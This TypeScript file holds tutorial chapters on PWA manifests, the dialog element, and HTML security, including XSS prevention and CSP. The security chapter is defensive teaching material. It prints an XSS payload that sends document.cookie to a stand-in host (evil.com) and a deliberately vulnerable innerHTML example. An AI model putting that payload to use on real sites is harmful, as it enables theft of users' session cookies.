import type { Chapter } from "./types";

// ============================================================================
// HTML CHAPTER 36 — PWAS AND MANIFEST
// ============================================================================
export const htmlCh36: Chapter = {
  id: "html-ch-36",
  number: 36,
  title: "PWAs and Manifest",
  subtitle: "manifest.json basics.",
  difficulty: "Advanced",
  estimatedMinutes: 35,
  xpReward: 110,
  prerequisites: ["html-ch-35"],
  partLabel: "Part 6: Advanced HTML",
  learningObjectives: [
    "Understand what Progressive Web Apps (PWAs) are.",
    "Create a web app manifest file.",
    "Link the manifest to your HTML page.",
    "Configure PWA properties like name, icons, and theme color.",
    "Understand the benefits of PWAs for user experience.",
  ],
  sections: [
    {
      id: "ch36-s1",
      title: "What is a PWA?",
      whyItMatters: "Progressive Web Apps combine the best of web and native apps. They're installable, work offline, and provide a native-like experience. The manifest is a key piece of PWA architecture.",
      realWorldAnalogy: "A PWA is like a website that can live on your phone's home screen like a regular app. It's the best of both worlds—accessible via browser but with app-like features like offline support and push notifications.",
      content: `**What is a Progressive Web App?**
A Progressive Web App (PWA) is a web application that uses modern web capabilities to deliver an app-like experience to users. PWAs are:
- **Installable**: Can be added to home screen
- **Offline-capable**: Work without internet connection
- **Responsive**: Work on all device sizes
- **Secure**: Served over HTTPS
- **Discoverable**: Identifiable as applications
- **Linkable**: Can be shared via URL

**The Web App Manifest:**
The manifest is a JSON file that describes your PWA. It tells the browser how your app should behave when installed.

**Key manifest properties:**
- name: Full app name
- short_name: Short name for home screen
- description: App description
- start_url: URL to launch when app opens
- display: Display mode (fullscreen, standalone, etc.)
- background_color: Splash screen background
- theme_color: UI theme color
- icons: App icons of various sizes
- orientation: Preferred orientation

**Display modes:**
- fullscreen: Full screen, no UI
- standalone: Native app-like
- minimal-ui: Minimal browser UI
- browser: Regular browser tab

**Benefits of PWAs:**
- **Better engagement**: Higher install and usage rates
- **Offline access**: Content available without internet
- **Push notifications**: Re-engage users
- **Fast loading**: Optimized performance
- **Cross-platform**: Single codebase for all platforms`,
      codeExamples: [
        {
          id: "ch36-s1-ex1",
          title: "Basic manifest.json",
          description: "A complete web app manifest for a PWA.",
          code: {
            html: `{
  "name": "My Progressive Web App",
  "short_name": "MyPWA",
  "description": "A progressive web app example",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#007bff",
  "orientation": "portrait",
  "icons": [
    {
      "src": "/icons/icon-192x192.png",
      "sizes": "192x192",
      "type": "image/png"
    },
    {
      "src": "/icons/icon-512x512.png",
      "sizes": "512x512",
      "type": "image/png"
    }
  ]
}`,
          },
          explanation: "This manifest defines a PWA with full and short names, display mode set to standalone (app-like), theme colors for UI, and icons for home screen and splash screen. The start_url is the root path.",
          tryItPrompt: "Create a manifest.json file for a simple website and link it in your HTML to see the 'Add to Home Screen' prompt appear on mobile devices.",
        },
      ],
      callouts: [
        { type: "tip", title: "Icon sizes matter", content: "Provide multiple icon sizes (72x72, 96x96, 128x128, 144x144, 152x152, 192x192, 384x384, 512x512) to ensure your app looks good on all devices. Include both PNG and ICO formats for maximum compatibility.",
        },
        { type: "common-mistake", title: "Missing HTTPS", content: "PWAs must be served over HTTPS. They won't work on HTTP (except localhost). Make sure your site has SSL/TLS configured before implementing PWA features.",
        },
      ],
    },
    {
      id: "ch36-s2",
      title: "Linking the Manifest",
      whyItMatters: "The manifest must be linked in your HTML for the browser to discover it. Proper linking ensures users can install your PWA and it displays correctly.",
      content: `**Linking the manifest:**
\`\`\`
<link rel="manifest" href="/manifest.json">
\`\`\`
Add this link tag in the <head> of your HTML.

**Best practices:**
- Place the manifest in your site root
- Use absolute path (/manifest.json)
- Serve with correct MIME type (application/manifest+json)
- Include theme color meta tag as fallback
- Add apple-touch-icon for iOS compatibility

**iOS support:**
iOS doesn't fully support the manifest yet. Add these meta tags for iOS:
\`\`\`
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="apple-mobile-web-app-title" content="MyPWA">
<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
\`\`\`

**Testing the manifest:**
Use Chrome DevTools:
1. Open DevTools (F12)
2. Go to Application tab
3. Click Manifest
4. Verify manifest loads correctly
5. Test 'Add to Home Screen' feature

**Service Worker:**
PWAs also need a service worker for offline functionality. The manifest handles the app identity and installation, while the service worker handles offline caching and background sync.`,
      codeExamples: [
        {
          id: "ch36-s2-ex1",
          title: "Complete PWA HTML setup",
          description: "HTML with manifest and iOS meta tags.",
          code: {
            html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#007bff">
  <meta name="description" content="My Progressive Web App">
  
  <!-- PWA Manifest -->
  <link rel="manifest" href="/manifest.json">
  
  <!-- iOS Support -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="MyPWA">
  <link rel="apple-touch-icon" href="/icons/icon-152x152.png">
  
  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
  
  <title>My Progressive Web App</title>
</head>
<body>
  <h1>Welcome to My PWA</h1>
  <script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js');
    }
  </script>
</body>
</html>`,
          },
          explanation: "Includes manifest link for PWA functionality. iOS meta tags for Apple device compatibility. Theme color meta tag matches manifest. Service worker registration enables offline capabilities. All necessary tags for cross-platform PWA support.",
          tryItPrompt: "Test this on a mobile device. On Chrome/Android, you should see the 'Add to Home Screen' prompt. On iOS, add to home screen manually via Safari's share menu.",
        },
      ],
      callouts: [
        { type: "info", title: "MIME type configuration", content: "Ensure your server serves manifest.json with Content-Type: application/manifest+json. Common servers like Nginx and Apache may need configuration to set the correct MIME type.",
        },
        { type: "warning", title: "Service worker required", content: "The manifest enables installation, but you need a service worker for true offline capability. Without a service worker, your PWA will still require internet to load content.",
        },
      ],
    },
  ],
  exercises: [
    {
      id: "ch36-ex1",
      title: "Create a manifest.json",
      difficulty: 1,
      description: "Create a web app manifest for a simple PWA.",
      requirements: ["Create manifest.json with required properties", "Include name, short_name, display mode", "Add at least 2 icon sizes", "Set theme_color and background_color", "Specify start_url"],
      starterCode: {
        html: `<!-- manifest.json would be a separate file -->`,
      },
      hints: [
        "Include name and short_name properties",
        "Set display to 'standalone' for app-like experience",
        "Add icons with sizes 192x192 and 512x512",
        "Use hex codes for colors (e.g., '#007bff')",
        "Set start_url to '/' or your main page",
      ],
      solution: {
        html: `<!-- manifest.json -->
{
  "name": "My Awesome App",
  "short_name": "AwesomeApp",
  "description": "An awesome progressive web app",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#6366f1",
  "orientation": "portrait",
  "icons": [
    {
      "src": "/icons/icon-192x192.png",
      "sizes": "192x192",
      "type": "image/png"
    },
    {
      "src": "/icons/icon-512x512.png",
      "sizes": "512x512",
      "type": "image/png"
    }
  ]
}`,
      },
      solutionExplanation: "Created manifest with name and short_name for different contexts. Display set to standalone for native app feel. Background and theme colors set for splash screen and UI. Two icon sizes provided for different device resolutions. Start_url set to root.",
    },
  ],
  quiz: {
    passingScore: 80,
    questions: [
      {
        id: "ch36-q1",
        type: "mcq",
        question: "What file format is used for the web app manifest?",
        options: ["XML", "JSON", "YAML", "INI"],
        correctAnswer: 1,
        explanation: "The web app manifest uses JSON format. It's a simple JSON file with key-value pairs that describe the PWA's properties like name, icons, display mode, and theme colors.",
        difficulty: 1,
      },
      {
        id: "ch36-q2",
        type: "mcq",
        question: "What display mode makes a PWA look like a native app?",
        options: ["fullscreen", "standalone", "minimal-ui", "browser"],
        correctAnswer: 1,
        explanation: "The 'standalone' display mode makes the PWA look like a native app. It hides browser UI elements and provides an app-like experience. 'fullscreen' is even more immersive but may hide navigation controls.",
        difficulty: 1,
      },
      {
        id: "ch36-q3",
        type: "true-false",
        question: "PWAs can work offline without any additional setup.",
        options: ["True", "False"],
        correctAnswer: 1,
        explanation: "False. While the manifest enables PWA installation, offline capability requires a service worker to cache resources. The manifest alone doesn't provide offline functionality.",
        difficulty: 1,
      },
      {
        id: "ch36-q4",
        type: "mcq",
        question: "How do you link the manifest in HTML?",
        options: [
          "<link rel='pwa' href='/manifest.json'>",
          "<link rel='manifest' href='/manifest.json'>",
          "<script src='/manifest.json'></script>",
          "<meta name='manifest' content='/manifest.json'>",
        ],
        correctAnswer: 1,
        explanation: "Use <link rel='manifest' href='/manifest.json'> in the head of your HTML to link the manifest. This tells the browser where to find the PWA manifest file.",
        difficulty: 1,
      },
      {
        id: "ch36-q5",
        type: "mcq",
        question: "Why are multiple icon sizes needed in the manifest?",
        options: [
          "For different display modes",
          "For different device resolutions and contexts",
          "To increase the app file size",
          "Only one size is actually needed",
        ],
        correctAnswer: 1,
        explanation: "Multiple icon sizes are needed because different devices and contexts (home screen, splash screen, notification, etc.) require different icon resolutions. Providing multiple sizes ensures your PWA looks good everywhere.",
        difficulty: 2,
      },
    ],
  },
  cheatSheet: [
    { label: "Manifest format", value: "JSON" },
    { label: "Display mode", value: "standalone for app-like" },
    { label: "Link tag", value: "rel='manifest'" },
    { label: "HTTPS required", value: "No HTTP except localhost" },
    { label: "Icons", value: "Multiple sizes needed" },
    { label: "Service worker", value: "For offline capability" },
  ],
};

// ============================================================================
// HTML CHAPTER 37 — HTML DIALOG ELEMENT
// ============================================================================
export const htmlCh37: Chapter = {
  id: "html-ch-37",
  number: 37,
  title: "HTML Dialog Element",
  subtitle: "Native modals with <dialog>.",
  difficulty: "Intermediate",
  estimatedMinutes: 30,
  xpReward: 100,
  prerequisites: ["html-ch-36"],
  partLabel: "Part 6: Advanced HTML",
  learningObjectives: [
    "Understand the <dialog> element and its purpose.",
    "Use show() and showModal() to display dialogs.",
    "Implement modal and non-modal dialogs.",
    "Use the ::backdrop pseudo-element for styling.",
    "Handle dialog accessibility automatically.",
  ],
  sections: [
    {
      id: "ch37-s1",
      title: "The Dialog Element",
      whyItMatters: "The <dialog> element provides a native, accessible way to create modals and dialogs without JavaScript libraries. It handles focus management, keyboard navigation, and accessibility automatically.",
      realWorldAnalogy: "The dialog element is like a pre-built window frame with a door. You don't need to build the frame or door mechanism yourself—just put your content inside and tell it to open or close.",
      content: `**What is <dialog>?**
The \`<dialog>\` element represents a dialog box or other interactive component like a dismissible alert, inspector, or subwindow. It's a native HTML element for creating modals.

**Basic structure:**
\`\`\`
<dialog id="myDialog">
  <p>This is a dialog</p>
  <button id="closeBtn">Close</button>
</dialog>

<button id="openBtn">Open Dialog</button>

<script>
const dialog = document.getElementById('myDialog');
document.getElementById('openBtn').onclick = () => dialog.showModal();
document.getElementById('closeBtn').onclick = () => dialog.close();
</script>
\`\`\`

**Two types of dialogs:**
- **Modal dialogs**: showModal() - Blocking, backdrop, focus trap
- **Non-modal dialogs**: show() - Non-blocking, no backdrop

**Modal dialogs:**
\`\`\`
dialog.showModal(); // Opens as modal
dialog.close(); // Closes dialog
\`\`\`

**Non-modal dialogs:**
\`\`\`
dialog.show(); // Opens as non-modal
dialog.close(); // Closes dialog
\`\`\`

**Native features:**
- **Focus management**: Automatically traps focus in modals
- **Keyboard support**: Esc to close, Tab navigation
- **Accessibility**: Screen reader friendly
- **Backdrop**: Automatic backdrop for modals
- **Top layer**: Renders above other content

**Why use <dialog>?**
- **No libraries needed**: Native browser support
- **Accessible**: Built-in a11y features
- **Consistent**: Same behavior across browsers
- **Performant**: Optimized by browsers
- **Simple**: Minimal JavaScript required`,
      codeExamples: [
        {
          id: "ch37-s1-ex1",
          title: "Basic modal dialog",
          description: "Creating a simple modal dialog with show() and showModal().",
          code: {
            html: `<dialog id="alertDialog">
    <h2>Alert</h2>
    <p>This is an important message!</p>
    <form method="dialog">
        <button>OK</button>
    </form>
</dialog>

<button id="showModalBtn">Show Modal</button>
<button id="showBtn">Show Non-Modal</button>

<script>
const dialog = document.getElementById('alertDialog');
document.getElementById('showModalBtn').onclick = () => dialog.showModal();
document.getElementById('showBtn').onclick = () => dialog.show();
</script>`,
          },
          explanation: "The dialog can be opened as modal (blocking with backdrop) using showModal() or as non-modal using show(). The form with method='dialog' automatically closes the dialog when the button is clicked.",
          tryItPrompt: "Test both buttons. Notice the modal has a backdrop and traps focus, while the non-modal allows interaction with the rest of the page.",
        },
      ],
      callouts: [
        { type: "tip", title: "Form method='dialog'", content: "Using <form method='dialog'> inside a dialog automatically closes the dialog when any button in the form is clicked. No JavaScript needed for the close action.",
        },
        { type: "common-mistake", title: "Using display: none", content: "Don't use CSS display: none to hide dialogs. The <dialog> element handles hiding automatically. Using CSS can interfere with the native show() and showModal() methods.",
        },
      ],
    },
    {
      id: "ch37-s2",
      title: "Styling and Backdrop",
      whyItMatters: "Proper styling makes dialogs match your design. The ::backdrop pseudo-element lets you style the modal background. Understanding the top layer ensures dialogs render correctly.",
      content: `**Styling the dialog:**
\`\`\`
dialog {
    border: none;
    border-radius: 8px;
    padding: 20px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    max-width: 500px;
}

dialog::backdrop {
    background: rgba(0, 0, 0, 0.5);
}
\`\`\`

**The ::backdrop pseudo-element:**
Only available for modal dialogs (showModal()). Styles the backdrop behind the dialog.

**Dialog states:**
\`\`\`
dialog[open] {
    /* Dialog is visible */
}

dialog:not([open]) {
    /* Dialog is hidden */
}
\`\`\`

**Centering dialogs:**
\`\`\`
dialog {
    margin: auto;
}

/* Or with flexbox on container */
.dialog-container {
    display: flex;
    justify-content: center;
    align-items: center;
}
\`\`\`

**Return value:**
\`\`\`
const returnValue = dialog.showModal();
dialog.close('custom value');

dialog.addEventListener('close', () => {
    console.log(dialog.returnValue); // 'custom value'
});
\`\`\`

**The top layer:**
Modal dialogs render in the top layer, above all other content. This ensures they're always visible and not obscured by z-index issues.`,
      codeExamples: [
        {
          id: "ch37-s2-ex1",
          title: "Styled confirmation dialog",
          description: "A fully styled confirmation dialog with backdrop.",
          code: {
            html: `<style>
    dialog {
        border: none;
        border-radius: 12px;
        padding: 24px;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        max-width: 400px;
        margin: auto;
    }
    
    dialog::backdrop {
        background: rgba(0, 0, 0, 0.6);
        backdrop-filter: blur(2px);
    }
    
    dialog h2 {
        margin: 0 0 16px 0;
        color: #333;
    }
    
    dialog p {
        margin: 0 0 24px 0;
        color: #666;
        line-height: 1.5;
    }
    
    dialog button {
        padding: 10px 20px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        margin-right: 8px;
    }
    
    dialog button.primary {
        background: #007bff;
        color: white;
    }
    
    dialog button.secondary {
        background: #e0e0e0;
        color: #333;
    }
</style>

<dialog id="confirmDialog">
    <h2>Confirm Action</h2>
    <p>Are you sure you want to proceed? This action cannot be undone.</p>
    <form method="dialog">
        <button value="cancel" class="secondary">Cancel</button>
        <button value="confirm" class="primary">Confirm</button>
    </form>
</dialog>

<button id="openConfirm">Delete Item</button>

<script>
const dialog = document.getElementById('confirmDialog');
document.getElementById('openConfirm').onclick = () => dialog.showModal();

dialog.addEventListener('close', () => {
    if (dialog.returnValue === 'confirm') {
        console.log('User confirmed');
    } else {
        console.log('User cancelled');
    }
});
</script>`,
          },
          explanation: "Styled dialog with rounded corners, shadow, and backdrop with blur effect. Two buttons with different styles. The close event checks returnValue to determine which button was clicked. Form method='dialog' handles closing automatically.",
          tryItPrompt: "Click the button to open the dialog. Try both Cancel and Confirm. Notice the backdrop blur effect and how the dialog is centered.",
        },
      ],
      callouts: [
        { type: "info", title: "Backdrop only for modals", content: "The ::backdrop pseudo-element only works for modal dialogs (opened with showModal()). Non-modal dialogs don't have a backdrop since they don't block interaction with the page.",
        },
        { type: "common-mistake", title: "Z-index conflicts", content: "Don't try to z-index dialogs. Modal dialogs automatically render in the top layer above all other content. Using z-index on dialogs can cause issues and is unnecessary.",
        },
      ],
    },
  ],
  exercises: [
    {
      id: "ch37-ex1",
      title: "Create a contact form dialog",
      difficulty: 1,
      description: "Create a modal dialog with a contact form.",
      requirements: ["Use <dialog> element", "Implement showModal() to open", "Add form fields (name, email, message)", "Include close button", "Style the dialog and backdrop"],
      starterCode: {
        html: `<button id="openContact">Contact Us</button>

<!-- Add your dialog here -->`,
      },
      hints: [
        "Create dialog element with id",
        "Add form with input fields inside dialog",
        "Use form method='dialog' for auto-close",
        "Style dialog with border-radius and padding",
        "Style ::backdrop for background overlay",
      ],
      solution: {
        html: `<style>
    dialog {
        border: none;
        border-radius: 8px;
        padding: 24px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        max-width: 400px;
    }
    
    dialog::backdrop {
        background: rgba(0, 0, 0, 0.5);
    }
    
    dialog form {
        display: flex;
        flex-direction: column;
        gap: 12px;
    }
    
    dialog input, dialog textarea {
        padding: 8px;
        border: 1px solid #ddd;
        border-radius: 4px;
    }
    
    dialog button {
        padding: 10px;
        background: #007bff;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }
</style>

<button id="openContact">Contact Us</button>

<dialog id="contactDialog">
    <h2>Contact Us</h2>
    <form method="dialog">
        <label>Name: <input type="text" required></label>
        <label>Email: <input type="email" required></label>
        <label>Message: <textarea rows="4" required></textarea></label>
        <button type="submit">Send</button>
    </form>
</dialog>

<script>
const dialog = document.getElementById('contactDialog');
document.getElementById('openContact').onclick = () => dialog.showModal();
</script>`,
      },
      solutionExplanation: "Created dialog with contact form containing name, email, and message fields. Styled with border-radius, shadow, and backdrop. Form method='dialog' enables auto-close on submit. showModal() opens as modal with backdrop. All fields are required for validation.",
    },
  ],
  quiz: {
    passingScore: 80,
    questions: [
      {
        id: "ch37-q1",
        type: "mcq",
        question: "What method opens a dialog as a modal?",
        options: ["dialog.open()", "dialog.show()", "dialog.showModal()", "dialog.display()"],
        correctAnswer: 2,
        explanation: "showModal() opens the dialog as a modal, which blocks interaction with the rest of the page, shows a backdrop, and traps focus. show() opens it as a non-modal dialog.",
        difficulty: 1,
      },
      {
        id: "ch37-q2",
        type: "mcq",
        question: "What pseudo-element styles the modal backdrop?",
        options: ["::background", "::backdrop", "::overlay", "::modal-backdrop"],
        correctAnswer: 1,
        explanation: "::backdrop is the pseudo-element that styles the backdrop behind modal dialogs. It only works for dialogs opened with showModal(), not for non-modal dialogs.",
        difficulty: 1,
      },
      {
        id: "ch37-q3",
        type: "true-false",
        question: "Non-modal dialogs have a backdrop.",
        options: ["True", "False"],
        correctAnswer: 1,
        explanation: "False. Non-modal dialogs (opened with show()) do not have a backdrop. Only modal dialogs (opened with showModal()) have a ::backdrop pseudo-element that can be styled.",
        difficulty: 1,
      },
      {
        id: "ch37-q4",
        type: "mcq",
        question: "What form attribute automatically closes the dialog when a button is clicked?",
        options: ["method='close'", "method='dialog'", "action='close'", "data-close"],
        correctAnswer: 1,
        explanation: "Using <form method='dialog'> inside a dialog automatically closes the dialog when any button in the form is clicked. No JavaScript close() call needed.",
        difficulty: 1,
      },
      {
        id: "ch37-q5",
        type: "mcq",
        question: "What keyboard key closes a modal dialog by default?",
        options: ["Enter", "Escape", "Tab", "Space"],
        correctAnswer: 1,
        explanation: "Pressing Escape closes a modal dialog by default. This is built-in accessibility behavior. You can prevent this with event.preventDefault() if needed, but it's generally not recommended.",
        difficulty: 2,
      },
    ],
  },
  cheatSheet: [
    { label: "showModal()", value: "Open as modal" },
    { label: "show()", value: "Open as non-modal" },
    { label: "close()", value: "Close dialog" },
    { label: "::backdrop", value: "Style modal background" },
    { label: "method='dialog'", value: "Auto-close form" },
    { label: "Top layer", value: "Above all content" },
  ],
};

// ============================================================================
// HTML CHAPTER 38 — HTML SECURITY
// ============================================================================
export const htmlCh38: Chapter = {
  id: "html-ch-38",
  number: 38,
  title: "HTML Security",
  subtitle: "CSP, XSS prevention.",
  difficulty: "Advanced",
  estimatedMinutes: 35,
  xpReward: 110,
  prerequisites: ["html-ch-37"],
  partLabel: "Part 6: Advanced HTML",
  learningObjectives: [
    "Understand Cross-Site Scripting (XSS) vulnerabilities.",
    "Implement Content Security Policy (CSP) headers.",
    "Sanitize user input to prevent XSS attacks.",
    "Use secure HTML attributes and practices.",
    "Configure security-related meta tags.",
  ],
  sections: [
    {
      id: "ch38-s1",
      title: "Cross-Site Scripting (XSS)",
      whyItMatters: "XSS is one of the most common web security vulnerabilities. Understanding how it works and how to prevent it is essential for building secure web applications.",
      realWorldAnalogy: "XSS is like someone slipping a fake instruction into your mailbox. When you read and follow it, you're doing something the attacker wanted, not what you intended. The attacker's code runs in your browser with your permissions.",
      content: `**What is XSS?**
Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same permissions as the legitimate site.

**Types of XSS:**
- **Stored XSS**: Malicious script stored on server (e.g., in database)
- **Reflected XSS**: Script reflected off server (e.g., in URL parameters)
- **DOM-based XSS**: Vulnerability in client-side JavaScript

**How XSS works:**
1. Attacker injects malicious code (e.g., in form input)
2. Application stores or reflects the input
3. User visits page containing the malicious code
4. Browser executes the script in user's context

**What attackers can do with XSS:**
- Steal cookies and session tokens
- Redirect users to malicious sites
- Modify page content
- Perform actions on behalf of users
- Install malware

**XSS example:**
\`\`\`
<!-- Attacker inputs this in a comment field -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- If not sanitized, this executes when page loads -->
<div class="comment">
    <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
</div>
\`\`\`

**Prevention strategies:**
- **Input validation**: Validate and sanitize all user input
- **Output encoding**: Encode data before outputting to HTML
- **Content Security Policy**: Restrict script sources
- **HTTP-only cookies**: Prevent JavaScript access to cookies
- **Use safe APIs**: textContent instead of innerHTML`,
      codeExamples: [
        {
          id: "ch38-s1-ex1",
          title: "XSS vulnerability vs safe code",
          description: "Comparing vulnerable and secure code patterns.",
          code: {
            html: `<!-- VULNERABLE: Directly using user input -->
<div id="user-content"></div>
<script>
const userInput = '<script>alert("XSS")</script>';
document.getElementById('user-content').innerHTML = userInput;
</script>

<!-- SAFE: Using textContent -->
<div id="user-content"></div>
<script>
const userInput = '<script>alert("XSS")</script>';
document.getElementById('user-content').textContent = userInput;
</script>

<!-- SAFE: Escaping HTML -->
<div id="user-content"></div>
<script>
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
const userInput = '<script>alert("XSS")</script>';
document.getElementById('user-content').innerHTML = escapeHtml(userInput);
</script>`,
          },
          explanation: "The vulnerable version uses innerHTML with unsanitized input, allowing script execution. Safe versions use textContent (treats input as text) or escape HTML entities before using innerHTML.",
          tryItPrompt: "Test each version with the same malicious input. Notice how the vulnerable version executes the script while the safe versions display it as text.",
        },
      ],
      callouts: [
        { type: "warning", title: "Never trust user input", content: "Assume all user input is malicious. Validate on input, encode on output. Even data from your database could be compromised. Always sanitize before displaying user-provided content.",
        },
        { type: "tip", title: "Use textContent over innerHTML", content: "Whenever possible, use textContent instead of innerHTML. textContent treats content as plain text and won't execute scripts. Only use innerHTML when you explicitly need to insert HTML and you've sanitized it.",
        },
      ],
    },
    {
      id: "ch38-s2",
      title: "Content Security Policy",
      whyItMatters: "CSP is a powerful defense against XSS attacks. It allows you to control which resources can be loaded and executed, significantly reducing the attack surface.",
      content: `**What is CSP?**
Content Security Policy (CSP) is an HTTP header that tells the browser which sources of content are approved for the page. It helps prevent XSS by restricting where scripts can come from.

**CSP via HTTP header:**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
\`\`\`

**CSP via meta tag:**
\`\`\`
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
\`\`\`

**Common CSP directives:**
- **default-src**: Default policy for all content types
- **script-src**: Allowed sources for JavaScript
- **style-src**: Allowed sources for CSS
- **img-src**: Allowed sources for images
- **connect-src**: Allowed sources for AJAX/WebSocket
- **font-src**: Allowed sources for fonts
- **media-src**: Allowed sources for audio/video

**CSP sources:**
- **'self'**: Same origin as the document
- **'none'**: No sources allowed
- **https://example.com**: Specific domain
- **'unsafe-inline'**: Allow inline scripts/styles (not recommended)
- **'unsafe-eval'**: Allow eval() (not recommended)

**Strict CSP example:**
\`\`\`
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' https://cdn.trusted.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self';
\`\`\`

**Report-only mode:**
Test CSP without blocking:
\`\`\`
Content-Security-Policy-Report-Only: default-src 'self';
\`\`\``,
      codeExamples: [
        {
          id: "ch38-s2-ex1",
          title: "CSP meta tag configuration",
          description: "Implementing CSP via HTML meta tag.",
          code: {
            html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Page with CSP</title>
    
    <!-- Content Security Policy -->
    <meta http-equiv="Content-Security-Policy" 
          content="default-src 'self'; 
                   script-src 'self' https://cdn.jsdelivr.net;
                   style-src 'self' 'unsafe-inline';
                   img-src 'self' data: https:;
                   connect-src 'self'">
    
    <!-- HTTP-only cookie (set via server, shown for reference) -->
    <!-- Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict -->
    
</head>
<body>
    <h1>Secure Page</h1>
    <script src="/app.js"></script>
    <!-- Allowed: same origin -->
    
    <script src="https://cdn.jsdelivr.net/npm/library.js"></script>
    <!-- Allowed: in CSP -->
    
    <!-- This would be blocked by CSP -->
    <!-- <script src="https://evil.com/malicious.js"></script> -->
</body>
</html>`,
          },
          explanation: "CSP meta tag restricts scripts to same origin and trusted CDN. Inline scripts are blocked (unsafe-inline not in script-src). Images can be from same origin, data URLs, or HTTPS. This prevents loading malicious external scripts.",
          tryItPrompt: "Use Chrome DevTools Console to see CSP violations. Try adding a script from an untrusted domain and watch it get blocked.",
        },
      ],
      callouts: [
        { type: "info", title: "Report URI", content: "Add report-uri to your CSP to receive reports about violations: report-uri /csp-violation-report-endpoint. This helps you debug and identify issues before enforcing strict policies.",
        },
        { type: "common-mistake", title: "Using unsafe-inline", content: "Avoid 'unsafe-inline' in script-src whenever possible. It defeats the purpose of CSP. Move inline scripts to external files or use nonces/hashes for specific inline scripts.",
        },
      ],
    },
  ],
  exercises: [
    {
      id: "ch38-ex1",
      title: "Secure user input handling",
      difficulty: 1,
      description: "Create a secure comment system that prevents XSS.",
      requirements: ["Use textContent instead of innerHTML", "Sanitize user input before display", "Implement input validation", "Add CSP meta tag", "Show both vulnerable and safe examples"],
      starterCode: {
        html: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

<div id="comments"></div>
<input type="text" id="commentInput" placeholder="Add comment">
<button onclick="addComment()">Add</button>

<script>
function addComment() {
    // Add secure comment handling here
}
</script>`,
      },
      hints: [
        "Use textContent to set comment text",
        "Validate input length and content",
        "Never use innerHTML with user input",
        "CSP blocks inline scripts from external domains",
        "Consider escaping HTML if you must use innerHTML",
      ],
      solution: {
        html: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

<div id="comments"></div>
<input type="text" id="commentInput" placeholder="Add comment" maxlength="500">
<button onclick="addComment()">Add</button>

<script>
function addComment() {
    const input = document.getElementById('commentInput');
    const comments = document.getElementById('comments');
    const text = input.value.trim();
    
    // Validate input
    if (!text) return;
    if (text.length > 500) {
        alert('Comment too long');
        return;
    }
    
    // Create comment element
    const commentDiv = document.createElement('div');
    commentDiv.className = 'comment';
    
    // SAFE: Use textContent to prevent XSS
    commentDiv.textContent = text;
    
    // Add timestamp
    const timeSpan = document.createElement('span');
    timeSpan.className = 'timestamp';
    timeSpan.textContent = ' - ' + new Date().toLocaleTimeString();
    commentDiv.appendChild(timeSpan);
    
    comments.appendChild(commentDiv);
    input.value = '';
}
</script>`,
      },
      solutionExplanation: "Uses textContent instead of innerHTML to prevent XSS. Validates input length before processing. Creates DOM elements and safely sets text content. CSP meta tag restricts script sources to same origin only. Input maxlength provides client-side validation.",
    },
  ],
  quiz: {
    passingScore: 80,
    questions: [
      {
        id: "ch38-q1",
        type: "mcq",
        question: "What does XSS stand for?",
        options: [
          "Extended Style Sheet",
          "Cross-Site Scripting",
          "External Script Source",
          "Cross-System Security",
        ],
        correctAnswer: 1,
        explanation: "XSS stands for Cross-Site Scripting. It's a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.",
        difficulty: 1,
      },
      {
        id: "ch38-q2",
        type: "mcq",
        question: "Which property should you use to safely set text content?",
        options: ["innerHTML", "textContent", "outerHTML", "value"],
        correctAnswer: 1,
        explanation: "textContent safely sets text content without interpreting HTML or executing scripts. innerHTML can execute scripts if the content contains malicious code, making it unsafe for user input.",
        difficulty: 1,
      },
      {
        id: "ch38-q3",
        type: "true-false",
        question: "Content Security Policy (CSP) can prevent XSS attacks.",
        options: ["True", "False"],
        correctAnswer: 0,
        explanation: "True. CSP is a powerful defense against XSS. It restricts which sources can load scripts, preventing attackers from injecting malicious scripts from external domains.",
        difficulty: 1,
      },
      {
        id: "ch38-q4",
        type: "mcq",
        question: "What CSP directive controls script sources?",
        options: ["default-src", "script-src", "style-src", "connect-src"],
        correctAnswer: 1,
        explanation: "script-src controls which sources can load JavaScript. It's the key directive for preventing XSS by restricting where scripts can come from.",
        difficulty: 1,
      },
      {
        id: "ch38-q5",
        type: "mcq",
        question: "Why should you avoid 'unsafe-inline' in CSP?",
        options: [
          "It's deprecated",
          "It allows any inline scripts, defeating CSP's purpose",
          "It causes performance issues",
          "It's not supported by all browsers",
        ],
        correctAnswer: 1,
        explanation: "'unsafe-inline' allows any inline scripts, which defeats the security purpose of CSP. Attackers could inject inline scripts that would execute even with CSP. Move scripts to external files instead.",
